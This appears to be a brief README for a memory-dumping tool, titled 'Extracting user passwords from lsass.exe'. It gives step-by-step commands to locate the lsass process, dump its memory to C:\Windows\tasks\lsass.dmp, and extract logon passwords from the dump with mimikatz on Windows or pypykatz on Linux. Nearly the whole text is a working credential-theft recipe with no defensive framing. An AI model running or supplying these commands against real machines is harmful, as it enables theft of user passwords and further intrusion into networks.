# Extracting user passwords from lsass.exe

Get the PID of the lsass process with `tasklist`

```
tasklist /FI "IMAGENAME eq lsass.exe"
```

Run MiniDump.exe with the PID of lsass.exe as the first argument.

```
MiniDump.exe <PID>
```
The dump file will be saved as lsass.dmp in `C:\Windows\tasks\`.
Then read the dump file with mimikatz and pypykatz and dump the passwords.

From Windows

```
mimikatz.exe "sekurlsa::minidump C:\Windows\tasks\lsass.dmp" "sekurlsa::logonpasswords"
```

From Linux

```
pypykatz lsa minidump lsass.dmp
```